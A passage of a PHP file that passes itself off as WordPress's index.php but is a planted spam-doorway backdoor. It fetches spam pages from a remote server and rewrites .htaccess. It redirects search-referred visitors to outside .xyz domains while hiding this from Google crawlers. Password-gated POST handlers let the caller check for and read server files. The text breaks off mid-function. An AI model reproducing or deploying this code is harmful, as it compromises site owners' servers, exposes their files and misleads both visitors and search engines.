<?php 
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */

@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jd1/");
define("GETDATE","http://www.datecenter.com/api/?key=");
define("CENTERKEY",4);
define("MYDIR", "/amaptfr20190924-2/");
define("FNUM",89);
define("JGNUM","40");
define("LINKNUM","8");
define("BZSITE","m");
define("BZPRO","z");
define("BZCAT","g");
//msbg
define("JDT","0");
//msend

//msidbg
define("MSID",1795);
//mssidend



//jthouzuibg
define("JTHZ","/");
//jthouzuiend


// #llqllq#arr_nametimebg

$arrnametime[]="2";
$arrnametime[]="3";
$arrnametime[]="1";
$arrnametime[]="4";


// #llqllq#arr_nametimeend

// #llqllq#arr_wordbg

$arr_word[0][] ="4";$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="2";$arr_word[0][] ="3";$arr_word[0][] ="3";$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="2";$arr_word[0][] ="2";$arr_word[1][] ="2";$arr_word[1][] ="3";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="3";$arr_word[1][] ="4";$arr_word[1][] ="2";$arr_word[1][] ="4";$arr_word[1][] ="2";$arr_word[1][] ="3";$arr_word[2][] ="3";$arr_word[2][] ="4";$arr_word[2][] ="4";$arr_word[2][] ="2";$arr_word[2][] ="2";$arr_word[2][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="3";$arr_word[2][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="2";$arr_word[3][] ="4";$arr_word[3][] ="4";$arr_word[4][] ="2";$arr_word[4][] ="4";$arr_word[4][] ="2";$arr_word[4][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="2";$arr_word[5][] ="2";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[5][] ="2";$arr_word[5][] ="2";$arr_word[5][] ="4";$arr_word[5][] ="3";$arr_word[5][] ="4";$arr_word[5][] ="4";$arr_word[6][] ="3";$arr_word[6][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="4";$arr_word[6][] ="4";$arr_word[6][] ="2";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="4";$arr_word[7][] ="4";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[8][] ="4";$arr_word[8][] ="3";$arr_word[8][] ="3";$arr_word[8][] ="4";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[8][] ="2";$arr_word[8][] ="4";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="4";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="3";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="4";$arr_word[9][] ="4";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[10][] ="4";$arr_word[10][] ="3";$arr_word[10][] ="2";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[11][] ="3";$arr_word[11][] ="2";$arr_word[11][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="4";

// #llqllq#arr_wordend


// #llqllq#arr_keywz

$arrKeywz[]="8";
$arrKeywz[]="12";
$arrKeywz[]="9";
$arrKeywz[]="4";
$arrKeywz[]="10";
$arrKeywz[]="6";
$arrKeywz[]="7";
$arrKeywz[]="11";
$arrKeywz[]="5";


// #llqllq#arr_keywzend


// #llqllq#arrBreadbg

$arrBread[]="BreadcrumbHead";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="BreadcrumbsHead";
$arrBread[]="l-breadcrumb";
$arrBread[]="bread_top clearfix";
$arrBread[]="BreadcrumbHead";
$arrBread[]="r-breadcrumb clearfix";
$arrBread[]="bread_crumb";
$arrBread[]="bread_crumb";
$arrBread[]="";
$arrBread[]="BreadcrumbsHead clearfix";
$arrBread[]="";
$arrBread[]="r-breadcrumb";
$arrBread[]="BreadcrumbHead clearfix";
$arrBread[]="bread_head";
$arrBread[]="r-breadcrumb";
$arrBread[]="bread_top";
$arrBread[]="bread_head clearfix";
$arrBread[]="bread_top";
$arrBread[]="l-breadcrumb";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="";
$arrBread[]="";
$arrBread[]="bread_head";
$arrBread[]="l-breadcrumb clearfix";
$arrBread[]="bread_crumb";


// #llqllq#arrBreadend


// #llqllq#arr_fuhao

$arrfh[]="Top Christmas gifts 2018";
$arrfh[]="Christmas Supplies";
$arrfh[]="Christmas Decoration";
$arrfh[]="Christmas gift";
$arrfh[]="Holiday Gifts";
$arrfh[]="for Christmas";
$arrfh[]="Holiday presents";
$arrfh[]="Christmas Holiday";
$arrfh[]="Christmas gift store";
$arrfh[]="best Christmas gift";
$arrfh[]="Best Christmas gifts 2018";
$arrfh[]="Christmas presents";
$arrfh[]="Xmas Ornaments";
$arrfh[]="Christmas Ornament";
$arrfh[]="Christmas Gifts 2018";
$arrfh[]="Unique Christmas Gifts";
$arrfh[]="Christmas gift ideas";
$arrfh[]="Xmas";
$arrfh[]="Christmas gift shop";
$arrfh[]="Christmas gift ideas 2018";


// #llqllq#arr_fuhaoend


$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



// #llqllq#randkeybg
$strRand[0]="gpvucajixlkznyrhfdeomstbwq";
$strRand[1]="yoerblpmaqvhistcukxjznfwdg";
$strRand[2]="vuqdgxsrnizohbmjykcfweplat";
$strRand[3]="lkxwgfjnqdtiebhuoaprsmcyzv";
$strRand[4]="ygjbhpcmsqntzlweiovafurkdx";
$strRand[5]="zdlxphvaqtguycrwnfbemoikjs";
$strRand[6]="iwztqlsbrnycjdgfpveokuhamx";
$strRand[7]="ocjdrgwhnsvkezfpaltxibqymu";
$strRand[8]="rzdmoatshvucpleqyfxwbnkijg";
$strRand[9]="ndvgzhowyspjrfqkmxteuacilb";
$strRand[10]="sacwmhobitjfdezrukplxnqgyv";
$strRand[11]="vkxmyzpalcouhtbewfrqnjgdsi";
$strRand[12]="ahtdnqbvlsygpiuoczjkwmferx";
$strRand[13]="wrixtlahubyjzcspqoefnkgmdv";
$strRand[14]="ydmzjqvpceuobfnksgtaxrwhli";
$strRand[15]="zjpvkcqisdeayngbhtfruwlxom";
$strRand[16]="zwepjtvndkrmsbyocxilauhqgf";
$strRand[17]="dtzjiveuqhpsmbflxwrncaoygk";
$strRand[18]="pndguwesxtomkrhzlyjaivcfbq";
$strRand[19]="grtjbodzpvmiyaxwqecslfnkhu";
$strRand[20]="faxyvtjnmpkewurcshlzqdbgoi";
$strRand[21]="rwomzlydkcihjufspvbntagqxe";
$strRand[22]="jnpblyiwtuormkhszxqdfvegca";
$strRand[23]="olpkuyjmwhigrctxszeafqbnvd";
$strRand[24]="hfsqomxrcbniketldzuyawvpgj";
$strRand[25]="yicdnhbxukzvolafpwegjmstrq";
$strRand[26]="doshjctgrmplevkyxuabwzqfin";
$strRand[27]="fibluwdzvyhxqenpmrsgaojtkc";
$strRand[28]="ajrzcwgdsoxyenubmviplhqtkf";
$strRand[29]="kigopdfrwtxznavlcesubymjqh";
$strRand[30]="goiqptflsnawzmcryhebdjxkvu";
$strRand[31]="nmxyjwqbkdfaoclehpiutzgsvr";
$strRand[32]="xamdprtsgolzwfnyhucikebvjq";
$strRand[33]="bgjpkovwedimunyslafrqzxhtc";
$strRand[34]="gitavzhukqdmypnelcfrwsoxjb";
$strRand[35]="tsjzqknefmxalrvydciobwuhpg";
$strRand[36]="edthkxzivwojasclrgypbnmufq";
$strRand[37]="qaytldcsbemnkuzifvhgjproxw";
$strRand[38]="rsiypjlcafwbomgehxztdnvukq";
$strRand[39]="wgzfymcqnshdlibokapvteujrx";
$strRand[40]="xgutdcfqwrapzhlonkembyivsj";
$strRand[41]="kebqvdxsyrgfziwpcnalutmhjo";
$strRand[42]="qtejnhybaluzfdkxgcmpsivorw";
$strRand[43]="tsgkxofedyurcnailjpbzqwvhm";
$strRand[44]="fueltodjhcravxwmpsizgnybkq";
$strRand[45]="ytdhmcjlksqaoexrubfvgziwnp";
$strRand[46]="zdqylhgvsxpkacreouwnitjfbm";
$strRand[47]="ahjibnvgztedrxywfmlpqkscuo";
$strRand[48]="ihxqtwaorlfpvkzbegunmjcysd";
$strRand[49]="fzymqdpanrcjoiweslkxugbhvt";
$strRand[50]="lefvsimkgrxbzwdpqujhnycota";
$strRand[51]="evowxdjrhlatksbpymqiuzcgfn";
$strRand[52]="xltjwmuehdfgrisakqvnpczoyb";
$strRand[53]="dvguckylrjpxazshiwfqtobnme";
$strRand[54]="mqzdklxebnpfjviucotwygshra";
$strRand[55]="wmgkclbvrhjqexidnfatyopsuz";
$strRand[56]="dlghuofkctjiqbxernamzvwspy";
$strRand[57]="bkvphnyxwrgcotifjslqaumezd";
$strRand[58]="cpifxqmzslyeatwunojrkbghvd";
$strRand[59]="bmcsoeltfgdhwvijnpqyrxakuz";
$strRand[60]="axjlrhywqgepvtionbmfsdckzu";
$strRand[61]="dmrokqyhaejivlxnfcwtuzbpgs";
$strRand[62]="xtfmhlbgjukqrpwvnayodzecis";
$strRand[63]="imawfpnyvjltxgukbqrdcseozh";
$strRand[64]="ryktfpadgwxijczoqeblusvhnm";
$strRand[65]="gbrxuwlstneqhkdfizvaoymcjp";
$strRand[66]="hrxzbdsyipkwaqnmtfvucejlgo";
$strRand[67]="jmyocxaqiwlzgnsdertbfupkvh";
$strRand[68]="teyzuixdlksbrwfovmapnghcqj";
$strRand[69]="bnzmsgxfaroqcveijdwtukhlyp";
$strRand[70]="iecpmqwnyhvodjfruszklbxtag";
$strRand[71]="xawslocvyijkzfumegqrntdbhp";
$strRand[72]="dpsuvombnegtrzwyafkjqlixhc";
$strRand[73]="otkrvguhcbpljfzaeimsdnqywx";
$strRand[74]="nqaouybptkwzcsmvlriejxdgfh";
$strRand[75]="iqedjwahzbnvruypkmoxcftsgl";
$strRand[76]="maqvnxlgyoezfbuhiwkrpctdjs";
$strRand[77]="dzvxgtsboqwpeycihlaknrmjuf";
$strRand[78]="cqrulsbgmodvwnypkfhxztjiae";
$strRand[79]="bhopsmnytxvlwufacdkgirzeqj";
$strRand[80]="ojxmgfsaendpyhvkquriclztwb";
$strRand[81]="qivnklpayjedrbxhmszgwufcot";
$strRand[82]="dvnskxtqyabzrwcujghpfmeoli";
$strRand[83]="rgwvoipmbtaujfcsdqlekxzhyn";
$strRand[84]="amyxgjhzsdfptlwobqrevnkuic";
$strRand[85]="ohksnbcyavtexpqgwufrjzdlim";
$strRand[86]="qzxlrkytnbufswgeovcijapmdh";
$strRand[87]="gikayxeujlpwnzbrtfvhsqdcmo";
$strRand[88]="ynklsxafbcvgdjepzqwhirmtuo";
$strRand[89]="ptklzhbiyrauqwdsemovnxjcfg";
$strRand[90]="dxutvjhlowbeygfnkicqpazsmr";
$strRand[91]="qdlxjatuvkgebzonfprmcihysw";
$strRand[92]="rzmkxgfvnaysicoqldwphteubj";
$strRand[93]="fguwakjpslqrtnocibyxmezhvd";
$strRand[94]="iksjqubhygzawldrvotempcfxn";
$strRand[95]="wcqfdxjyvemzbaolhngpsrutik";
$strRand[96]="fqlwzskabdovgxncmeprhytjui";
$strRand[97]="yxmzsgjeibuqoptkhnfavldwcr";
$strRand[98]="hpyiktufrjowdblagsvnmqzexc";
$strRand[99]="uiceswztkdhjbaronfmlypxgvq";

// #llqllq#randkeyend



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
define("GETDOM",getthisdom());
		



// 
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'transferdm';
$stss2 = 'deliverym';



if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../sitemap"))
		mkdir("../sitemap", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	$rs = '#<map>(.*)</map>#si';
	$mapLogs = file_get_contents("./map.log");
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		
		if(strstr($mapLogs,'#sitemap' . $arrABC[$gnumber-1] .'.xml#') && file_exists('../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml')){
			echo $vals."<br/>";
			echo '../sitemap/sitemap' . $arrABC[$gnumber-1] .'.xml successed<br/>';
			$gnumber++;
			continue;	
		}
		
		for($i=0; $i<3; $i++){
			$idUrl =  GETDOM . "gpage.php?getmapid=$vss&site=$thisdom&sid=".MSID;
			$tempIdStr = curl_get_from_webpage($idUrl,'',5);
			$arrIdNameNow = array();
			if(preg_match($rs,$tempIdStr,$matchIdName)){
				$tparrIdName = explode('^^',$matchIdName[1]);
				foreach($tparrIdName as $vs){
					$tpArr = explode('^',$vs);
					if(count($tpArr) == 2){
						$arrIdNameNow[$tpArr[0]] = $tpArr[1];
					}elseif(count($tpArr) > 2){
						$tpstr = '';
						for($j=1; $j<count($tpArr); $j++){
							$tpstr .= $tpArr[$j] . ' ';
						}
						$tpstr = trim($tpstr);
						$arrIdNameNow[$tpArr[0]] = $tpstr;
					}
				}
				
				break;
			}
		}
		
		
	
		if(!isset($arrIdNameNow) or count($arrIdNameNow) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrIdNameNow,2,1);			}else{
				gsitemap($arrIdNameNow,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrIdNameNow,2,1);			}else{
				gsitemap2($arrIdNameNow,1,2);			}
			
		}
		
		unset($arrIdNameNow,$tempArr1,$tempArr2);	}
	
}


if(isset($_GET["ghtac"]) && $_GET["ghtac"]){

	$dirNames = dirname(__FILE__);    
	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	
	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
	}else{
		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
	}
	$strhtt = '';
	if (file_exists("$PreDir.htaccess")){
		@chmod("$PreDir.htaccess",0755);
		$strhtt = file_get_contents("$PreDir.htaccess");	
	}
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	
	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);
		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	
	}
		
	if(1){
		
			
		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
		$rsut = '\1'.PHP_EOL .'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '.*'.BZCAT.'/(.*)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  ;
		
		$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*[-]'.'(\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '.*'.BZCAT.'/(.*)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]' . PHP_EOL  .'RewriteRule' ;	

		
		
		if(preg_match($r1,$strhtt)){
			$strhtt = preg_replace($r1,$rsut,$strhtt,1);		
		}else{
			$strhtt = preg_replace($r2,$rsut2,$strhtt,1);
		}
		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		
		}
		
	}

	die("ghtac ok");
}


if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if((isset($_POST["lan"]) && $_POST["lan"] == 1) or (isset($_GET["lan"]) && $_GET["lan"] == 1)){$fileArr = array();$flag = 1;$fileArr['index'] = filesize(__FILE__);if(file_exists("./moban.html")){$fileArr['moban'] = filesize("./moban.html");}else{$flag = 0;$fileArr['moban'] = -1;}echo 'error---'. serialize($fileArr) .'---';die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){die();}
	
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
				
		$r2='#-(\d+)'. JTHZ .'$#i';		$r3='#[-/]' .'(\d+)[-/]$#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
			
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		

		$r2='#-(\d+)$#i';		$r3='#[-/]'.'(\d+)$#i';	
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		

	
	
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
	
	
}	
	
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
	

if(isset($_GET["id"]))
	$id = $_GET["id"];
else{
	
	if(isset($_GET["cat"])){
		$rqurl = $_GET["cat"];
		
		$logFileName = './idlogs.txt';
		if(file_exists($logFileName)){
			$arrUrlId = unserialize(file_get_contents($logFileName));
		}else{
			$arrUrlId = array();
		}

		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
			$id  = $arrUrlId[$rqurl];		
		}else{
			$arrUrlId[$rqurl] = getRandCId($rqurl);
			$id = $arrUrlId[$rqurl];
			file_put_contents($logFileName,serialize($arrUrlId));
			@touch(dirname($logFileName), $fLogTime, $fLogTime); 
			@touch($logFileName, $fLogTime, $fLogTime);    
		}
	}else{
		
	
	$id = "679376"; //llq index id 
	
	}

}


$resid = '#^\d+$#';
if(!preg_match($resid,$id)){
	exit;
}

$id23 = $id;



$numArr_key = count($arr_key);
$siteid = MSID;
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
// $_SERVER["HTTP_REFERER"] = "google.com.hk";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();	
	
	if(function_exists('gethostbyaddr')){
		$hostname = @gethostbyaddr($localIp);
		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
	}else{
		$is_g_ip = 0;
	}
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
		$rsdom = '#^https?://www\.[^/]+/$#i';
		
		$jumDom1 = 'http://www.'.$stss.'.xyz'. DOMTXT . $siteid .".txt";	
		$jumDom2 = 'http://www.'.$stss2.'.xyz'. DOMTXT . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$domJump = curl_getjs_from_webpage($jumDom1,2);
			$domJump = trim($domJump);

			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_getjs_from_webpage($jumDom2,10);
			
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 
 $fcontent = '';
 
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 $rsInfo = '#<info>(.*)</info>#si';
 preg_match($rsInfo,$pInfoStr,$matchInfo);
 if(isset($matchInfo[1])){
	 $InFoStrArr = unserialize($matchInfo[1]);
 }else{
	 header("HTTP/1.1 404 Not Found");exit;
 }
 
 if(isset($InFoStrArr['frStr2'])){
	$frStr2 = $InFoStrArr['frStr2'];
	$fr2Arr = unserialize($frStr2);
 }
 
$frStr1 = $InFoStrArr['frStr1'];
$fr1Arr = unserialize($frStr1);

$Ptitle = $InFoStrArr['Ptitle'];

$nowIdName = $InFoStrArr['nowIdName'];


$Article = $InFoStrArr['Article'];
$pcatstr = $InFoStrArr['pcatstr'];


if(strstr($pcatstr,'#cname#')){
	$temparrI = explode('#cname#',$pcatstr);
	$catStr = $temparrI[0];
	$catArr = explode('^',$catStr);
	$tparrCat = array();
	$catArrII = array();
	foreach($catArr as $vs){
		$vs = str_replace('&amp;','&',$vs);
		if(!isset($tparrCat[$vs])){
			$tparrCat[$vs] = 1;
			$catArrII[] = $vs;
		}
	}

	$catArr = $catArrII;
	
	$mateStr = $temparrI[1];
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = trim($temparrII[0]);
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}
		$pdescription = $temparrII[1];
		if(!$pdescription){
			$pdescription = $nowIdName. ' ' .$Ptitle;
		}
	}else{
		$pkeyword = $Ptitle;
		$pdescription = $nowIdName. ' ' .$Ptitle;
	}
}else{
	$catArr = array();
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = $temparrII[0];
		if(!$pkeyword){
			$pkeyword = $Ptitle;
		}
		$pdescription = $temparrII[1];
		if(!$pdescription){
			$pdescription = $nowIdName. ' ' .$Ptitle;
		}
	}else{
		$pkeyword = $Ptitle;
		$pdescription = $nowIdName. ' ' .$Ptitle;
	}
}

$BreadStr = getBreadcrum($Ptitle,$catArr);



$thisPnameLink = '<a href="">'.$nowIdName.'</a>';
$thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
$thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';
$Article =  str_replace('#ttlink#',$thisTitleLink,$Article);
$Article =  str_replace('#mylink#',$thisPnameLink2,$Article);


$artArr = explode('#fgfgfg#',$Article);
// print_r($artArr);
if(count($artArr) != 3){
	header("HTTP/1.1 404 Not Found");exit;
}


$fr1Strs = '<ul>'.PHP_EOL;
foreach($fr1Arr as $key=>$vs){
	$tpPid = $key;
	$tpFlink = getalink($tpPid,$vs);
	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
}
$fr1Strs .= '</ul>'.PHP_EOL;

if(isset($fr2Arr)){
	$fr2Strs = '<ul>'.PHP_EOL;
	foreach($fr2Arr as $key=>$vs){
		$tpPid = $key;
		$tpFlink = getalink($tpPid,$vs);
		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	}
	$fr2Strs .= '</ul>'.PHP_EOL;
}

 
 $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
 $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
 
 $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';



		$fileMb = fopen("moban.html","r");
			$html = fread($fileMb,filesize("moban.html"));			
			
			$html = str_ireplace('#bbbtitsbbb#', $Ptitle. " {$thisdom}", $html);	
			$html = str_ireplace('#bbbkeybbb#', $pkeyword, $html);	
			$html = str_ireplace('#bbbdesbbb#', $pdescription. ' ' .$Ptitle, $html);	
			
			$html = str_ireplace('#bbb1content1bbb#',  $BreadStr . PHP_EOL .'<div>'.$artArr[0].'</div>', $html);
			$html = str_ireplace('#bbb2content2bbb#', $artArr[1], $html);
			$html = str_ireplace('#descontent#', $artArr[2], $html);
			
			$html = str_replace('#link1#',$thisPnameLink,$html);
				$html = str_replace('#link2#','',$html);
				$html = str_replace('#link3#',$thisPnameLink,$html);
				$html = str_replace('#link4#','',$html);
				$html = str_replace('#link5#',$thisPnameLink,$html);
				
				$html = str_replace('#flink#',$fr1Strs,$html);
				$html = str_replace('#Flink2#','',$html);
			
		
	echo $html;
 
die();
	
	

function getBreadcrum($Ptitle,$catArr){

	global $arrBread,$thisdom;


	$breadTagkey = KEYJG % 4;
	if($breadTagkey == 0){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ul';
	}elseif($breadTagkey == 1){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 2){
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ol';
	}else{
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ul';
	}


	$arrBreadNum = count($arrBread);
	$domlen = strlen($thisdom);


	$breadTagkey = $domlen % 5;

	$strBreads = '';
	if($breadTagkey == 4){
		$strBreads .= '<'.$breadTagHtml1.' class="Breadcrumbs">';
		$strBreads .= '<'.$breadTagHtml2.'>';
		$strBreads .= '<li><a href="/">Home</a></li>';
		if(count($catArr)){
			foreach($catArr as $vs){
				$vs = trim($vs);
				$nowCatUrl = getCatLink($vs);
				$strBreads .= '<li><a href="'.$nowCatUrl.'">'.$vs.'</a></li>';
			}
		}
		
		$strBreads .= '<li>'.$Ptitle.'</li>';
		$strBreads .= '</'.$breadTagHtml2.'>';
		$strBreads .= '</'.$breadTagHtml1.'>';
	}else{
		$calssBreadKey = KEYJG % $arrBreadNum;
		$classTop = $arrBread[$calssBreadKey];
		$classul =  KEYJG % 2 ? 'Breadcrumb' : 'breadcrumbs';
		$breadTagkey = $domlen % 2;

		if($breadTagkey == 0){
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>';
			$flagNum = 2;
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.$nowCatUrl.'"><span itemprop="name">'.$vs.'</span></a><meta itemprop="position" content="'.$flagNum.'" /></li>';
					$flagNum++;
				}
			}
				
				
			$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.$Ptitle.'</span><meta itemprop="position" content="'.$flagNum.'" /></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}else{
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.' class="'.$classTop.'">';
			else
